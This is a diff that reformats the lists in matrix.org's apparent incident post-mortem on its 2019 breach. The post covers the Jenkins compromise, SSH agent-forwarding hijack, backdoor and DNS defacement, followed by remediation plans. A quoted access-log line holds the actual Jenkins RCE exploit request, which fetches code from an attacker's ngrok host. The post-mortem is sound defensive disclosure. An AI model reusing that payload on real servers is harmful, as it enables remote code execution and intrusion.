@@ -18,23 +18,23 @@ image = "https://matrix.org/blog/img/services.png"
 - [The Defacement](#the-defacement)
 - [The Rebuild](#the-rebuild)
 - [Remediations](#remediations)
-  - [SSH](#ssh)
-    - [SSH agent forwarding should be disabled.](#ssh-agent-forwarding-should-be-disabled)
-    - [SSH should not be exposed to the general internet](#ssh-should-not-be-exposed-to-the-general-internet)
-    - [SSH keys should give minimal access](#ssh-keys-should-give-minimal-access)
-    - [Two factor authentication](#two-factor-authentication)
-    - [It should be made as hard as possible to add malicious SSH keys](#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys)
-    - [Changes to SSH keys should be carefully monitored](#changes-to-ssh-keys-should-be-carefully-monitored)
-    - [SSH config should be hardened, disabling unnecessary options](#ssh-config-should-be-hardened-disabling-unnecessary-options)
-  - [Network architecture](#network-architecture)
-  - [Keeping patched](#keeping-patched)
-  - [Intrusion detection](#intrusion-detection)
-  - [Incident management](#incident-management)
-  - [Configuration management](#configuration-management)
-  - [Avoiding temporary measures which last forever](#avoiding-temporary-measures-which-last-forever)
-  - [Secure packaging](#secure-packaging)
-  - [Dev and CI infrastructure](#dev-and-ci-infrastructure)
-  - [Log minimisation and handling Personally Identifying Information (PII)](#log-minimisation-and-handling-personally-identifying-information-pii)
+    - [SSH](#ssh)
+        - [SSH agent forwarding should be disabled.](#ssh-agent-forwarding-should-be-disabled)
+        - [SSH should not be exposed to the general internet](#ssh-should-not-be-exposed-to-the-general-internet)
+        - [SSH keys should give minimal access](#ssh-keys-should-give-minimal-access)
+        - [Two factor authentication](#two-factor-authentication)
+        - [It should be made as hard as possible to add malicious SSH keys](#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys)
+        - [Changes to SSH keys should be carefully monitored](#changes-to-ssh-keys-should-be-carefully-monitored)
+        - [SSH config should be hardened, disabling unnecessary options](#ssh-config-should-be-hardened-disabling-unnecessary-options)
+    - [Network architecture](#network-architecture)
+    - [Keeping patched](#keeping-patched)
+    - [Intrusion detection](#intrusion-detection)
+    - [Incident management](#incident-management)
+    - [Configuration management](#configuration-management)
+    - [Avoiding temporary measures which last forever](#avoiding-temporary-measures-which-last-forever)
+    - [Secure packaging](#secure-packaging)
+    - [Dev and CI infrastructure](#dev-and-ci-infrastructure)
+    - [Log minimisation and handling Personally Identifying Information (PII)](#log-minimisation-and-handling-personally-identifying-information-pii)
 - [Conclusion](#conclusion)
 
 ### Introduction
@@ -79,22 +79,20 @@ In this process, we spotted an unrecognised SSH key in `/root/.ssh/authorized_ke
 
 At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:
 
-
-
-*   The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - [https://www.exploit-db.com/exploits/46572](https://www.exploit-db.com/exploits/46572)):
+- The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - [https://www.exploit-db.com/exploits/46572](https://www.exploit-db.com/exploits/46572)):
 
 `matrix.org:443 151.34.xxx.xxx - - [13/Mar/2019:18:46:07 +0000] "GET /jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://5f36xxxx.ngrok.io/jenkins/%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP/1.1" 500 6083 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"`
 
-*   This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot/iOS and Riot/Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.
-*   On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.
-*   From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at `/usr/share/bsd-mail/shroot`).
-*   The majority of access to the hosts occurred between Apr 4th and 6th.
-*   There was no evidence of large-scale data exfiltration, based on analysing network logs.
-*   There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).
-*   There was no evidence of the identity server databases having been compromised.
-*   There was no evidence of tampering in our source code repositories.
-*   There was no evidence of tampering of our distributed software packages.
-*   Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.
+- This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot/iOS and Riot/Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.
+- On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.
+- From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at `/usr/share/bsd-mail/shroot`).
+- The majority of access to the hosts occurred between Apr 4th and 6th.
+- There was no evidence of large-scale data exfiltration, based on analysing network logs.
+- There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).
+- There was no evidence of the identity server databases having been compromised.
+- There was no evidence of tampering in our source code repositories.
+- There was no evidence of tampering of our distributed software packages.
+- Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.
 
 By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker’s behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.
 
@@ -110,9 +108,7 @@ At around 7am, we were woken up to the news that the attacker had managed to rep
 
 On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...
 
-
 ![Cloudflare login UI](/blog/img/cf.png)
-
 
 ...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the [Change API Key](https://support.cloudflare.com/hc/en-us/articles/221318707-How-do-I-change-my-Global-API-Key-) button.
 
@@ -124,17 +120,17 @@ To flush out the defacement we logged in directly as the admin user and changed 
 
 The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:
 
-*   Access via SSH restricted as heavily as possible
-*   SSH agent forwarding disabled server-side
-*   All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.
+- Access via SSH restricted as heavily as possible
+- SSH agent forwarding disabled server-side
+- All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.
 
 Then, whilst reinstating services on the new infra, we opted to review **everything** being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:
 
-*   Jenkins has been replaced by [Buildkite](https://buildkite.com/matrix-dot-org)
-*   Wordpress has been replaced by static generated sites (e.g. [Gatsby](https://github.com/matrix-org/matrix.org/tree/master/gatsby))
-*   cgit has been replaced by [gitlab](https://gitlab.matrix.org).
-*   Entirely new packaging building, signing & distribution infrastructure (more on that later)
-*   etc.
+- Jenkins has been replaced by [Buildkite](https://buildkite.com/matrix-dot-org)
+- Wordpress has been replaced by static generated sites (e.g. [Gatsby](https://github.com/matrix-org/matrix.org/tree/master/gatsby))
+- cgit has been replaced by [gitlab](https://gitlab.matrix.org).
+- Entirely new packaging building, signing & distribution infrastructure (more on that later)
+- etc.
 
 Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it’s important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.
 
@@ -158,11 +154,11 @@ We’ve split the remediation work into the following domains.
 
 Some of the biggest issues exposed by the security breach concerned our use of SSH, which we’ll take in turn:
 
-##### SSH agent forwarding should be disabled.
+##### SSH agent forwarding should be disabled
 
 SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‘forward’ access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.
 
-The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, [Github’s guide to using SSH agent forwarding](https://developer.github.com/v3/guides/using-ssh-agent-forwarding/#setting-up-ssh-agent-forwarding) says: 
+The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, [Github’s guide to using SSH agent forwarding](https://developer.github.com/v3/guides/using-ssh-agent-forwarding/#setting-up-ssh-agent-forwarding) says:
 
 > **Warning**: You may be tempted to use a wildcard like `Host *` to just apply this setting (ForwardAgent: yes) to all SSH connections. That's not really a good idea, as you'd be sharing your local SSH keys with _every_ server you SSH into. They won't have direct access to the keys, but they will be able to use them _as you_ while the connection is established. **You should only add servers you trust and that you intend to use with agent forwarding**
 
@@ -174,15 +170,13 @@ If there is one lesson everyone should learn from this whole mess, it is: **SSH 
 
 Our remediations for this are:
 
-
-
-*   Disable all ssh agent forwarding on the servers.
-*   If you need to jump through a box to ssh into another box, use `ssh -J $host`.
-*   This can also be used with rsync via `rsync -e "ssh -J $host"`
-*   If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s [release notes](https://www.openssh.com/txt/release-8.0) explicitly recommends using more modern protocols than scp).
-*   If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.
-*   If you just need to check out stuff from public git repos, use https rather than git+ssh.
-*   Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...
+- Disable all ssh agent forwarding on the servers.
+- If you need to jump through a box to ssh into another box, use `ssh -J $host`.
+- This can also be used with rsync via `rsync -e "ssh -J $host"`
+- If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s [release notes](https://www.openssh.com/txt/release-8.0) explicitly recommends using more modern protocols than scp).
+- If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.
+- If you just need to check out stuff from public git repos, use https rather than git+ssh.
+- Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...
 
 Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH’s does via `ssh-add -c`, but gnome-keyring for instance doesn’t), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.
 
@@ -218,7 +212,7 @@ Similarly, we are working on tracking changes and additions to other credentials
 
 If we’d gone through reviewing the default sshd config when we set up the datacenter in the first place, we’d have caught several of these failure modes at the outset.  We’ve now done so (as per above).
 
-We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines. 
+We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines.
 
 #### Network architecture
 
@@ -226,18 +220,16 @@ As mentioned in the History section, the legacy network infrastructure effective
 
 We are addressing this by:
 
+- Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
+    - Development
+    - Intranet
+    - Package Build (airgapped; see below for more details)
+    - Package Distribution
+    - Production, which is in turn split per class of service.
+- Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.
+- Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).
 
-
-*   Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
-    *   Development
-    *   Intranet
-    *   Package Build (airgapped; see below for more details)
-    *   Package Distribution
-    *   Production, which is in turn split per class of service.
-*   Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.
-*   Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).
-
-We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. 
+We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation.
 
 #### Keeping patched
 
@@ -257,19 +249,17 @@ There’s obviously a lot we need to do in terms of spotting future attacks as r
 
 There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:
 
-
-
-*   The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)
-*   The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.
-*   The need to have an existing inventory of services and secrets available for tracking progress and prioritisation
-*   The need to have a general incident management [checklist](https://news.ycombinator.com/item?id=19682451&p=2) for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
-    *   Remembering to appoint named incident manager, external comms manager & internal comms manager. (They could of course be the same person, but the roles are distinct).
-    *   Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff
-    *   Remembering to informing the ICO (Information Commissioner Office) of any user data breaches
-    *   Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)
-    *   Reminders to snapshot systems for forensics & backups
-    *   Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.
-    *   Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)
+- The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)
+- The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.
+- The need to have an existing inventory of services and secrets available for tracking progress and prioritisation
+- The need to have a general incident management [checklist](https://news.ycombinator.com/item?id=19682451&p=2) for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
+    - Remembering to appoint named incident manager, external comms manager & internal comms manager. (They could of course be the same person, but the roles are distinct).
+    - Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff
+    - Remembering to informing the ICO (Information Commissioner Office) of any user data breaches
+    - Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)
+    - Reminders to snapshot systems for forensics & backups
+    - Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.
+    - Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)
 
 #### Configuration management
 
@@ -291,29 +281,25 @@ Whilst the keys were compromised, none of the packages that we distribute were t
 
 In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:
 
-
-
-*   Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).
-*   We then perform all releases from a dedicated isolated release terminal.
-    *   This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.
-    *   Needless to say, the device is strictly used for *nothing* other than performing releases.
-    *   The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)
-    *   The signing keys (hardware or software) are kept exclusively on this device.
-    *   The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.
-    *   We physically store the device securely.
-    *   We ensure someone on the team always has physical access to it in order to do emergency builds.
-*   Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
-    *   These live at [https://packages.matrix.org](https://packages.matrix.org) and [https://packages.riot.im](https://packages.riot.im)
-    *   These are minimal machines with nothing but a static web-server.
-    *   They are accessed only via the dedicated SSH keys stored on the release terminal.
-    *   These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s [always online](https://www.cloudflare.com/always-online/) feature, for better or worse).
+- Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).
+- We then perform all releases from a dedicated isolated release terminal.
+    - This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.
+    - Needless to say, the device is strictly used for _nothing_ other than performing releases.
+    - The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)
+    - The signing keys (hardware or software) are kept exclusively on this device.
+    - The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.
+    - We physically store the device securely.
+    - We ensure someone on the team always has physical access to it in order to do emergency builds.
+- Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
+    - These live at [https://packages.matrix.org](https://packages.matrix.org) and [https://packages.riot.im](https://packages.riot.im)
+    - These are minimal machines with nothing but a static web-server.
+    - They are accessed only via the dedicated SSH keys stored on the release terminal.
+    - These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s [always online](https://www.cloudflare.com/always-online/) feature, for better or worse).
 
 Alternatives here included:
 
-
-
-*   In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.
-*   We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per [https://github.com/matrix-org/matrix.org/issues/370](https://github.com/matrix-org/matrix.org/issues/370)).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.
+- In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.
+- We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per [https://github.com/matrix-org/matrix.org/issues/370](https://github.com/matrix-org/matrix.org/issues/370)).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.
 
 #### Dev and CI infrastructure
 
@@ -323,11 +309,9 @@ The new pipelines have been set up so that where CI needs to push artefacts to p
 
 Other than CI, our strategy is:
 
-
-
-*   Continue using Github for public repositories
-*   Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like [Olm](https://gitlab.matrix.org/matrix-org/olm))
-*   Continue to host docker images on Docker Hub (despite their recent [security dramas](https://success.docker.com/article/docker-hub-user-notification)).
+- Continue using Github for public repositories
+- Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like [Olm](https://gitlab.matrix.org/matrix-org/olm))
+- Continue to host docker images on Docker Hub (despite their recent [security dramas](https://success.docker.com/article/docker-hub-user-notification)).
 
 #### Log minimisation and handling Personally Identifying Information (PII)
 
@@ -335,20 +319,16 @@ Another thing that the breach made painfully clear is that we log too much.  Whi
 
 However, we can still improve our logging and PII-handling substantially:
 
-
-
-*   Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).
-*   Minimising log retention to the bare minimum we need to investigate recent issues and abuse
-*   Ensuring that PII is stored hashed wherever possible.
+- Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).
+- Minimising log retention to the bare minimum we need to investigate recent issues and abuse
+- Ensuring that PII is stored hashed wherever possible.
 
 Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our [privacy policies](https://github.com/vector-im/policies/tree/master/docs/matrix-org) and [GDPR work](https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix/)), but there is also more we can do, particularly:
 
-
-
-*   Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is [https://github.com/vector-im/riot-web/issues/6779](https://github.com/vector-im/riot-web/issues/6779).
-*   We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is [https://github.com/matrix-org/synapse/issues/5145](https://github.com/matrix-org/synapse/issues/5145)
-*   We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is [https://github.com/matrix-org/matrix-doc/pull/1763](https://github.com/matrix-org/matrix-doc/pull/1763)
-*   We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is [https://github.com/matrix-org/matrix-doc/pull/1228](https://github.com/matrix-org/matrix-doc/pull/1228).
+- Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is [https://github.com/vector-im/riot-web/issues/6779](https://github.com/vector-im/riot-web/issues/6779).
+- We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is [https://github.com/matrix-org/synapse/issues/5145](https://github.com/matrix-org/synapse/issues/5145)
+- We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is [https://github.com/matrix-org/matrix-doc/pull/1763](https://github.com/matrix-org/matrix-doc/pull/1763)
+- We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is [https://github.com/matrix-org/matrix-doc/pull/1228](https://github.com/matrix-org/matrix-doc/pull/1228).
 
 ### Conclusion
 
